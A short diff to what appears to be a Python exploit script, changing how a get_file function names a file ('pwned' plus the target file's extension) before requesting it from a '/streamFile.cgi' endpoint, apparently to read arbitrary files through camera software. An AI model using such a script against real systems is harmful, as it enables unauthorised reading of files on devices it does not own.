@@ -45,10 +45,9 @@ def add_camera(url):
 
 def get_file(url, args, camera_oid, camera_ot):
     filename = "pwned"
-    if args.os == "windows":
-        # Windows requires an extension on the end of the filename we specified before
-        root, ext = os.path.splitext(args.file)
-        filename = filename + ext
+
+    root, ext = os.path.splitext(args.file)
+    filename = filename + ext
     endpoint = url + "/streamFile.cgi?oid={}&ot={}&fn={}"
     endpoint = endpoint.format(camera_oid, camera_ot, filename)
     try:
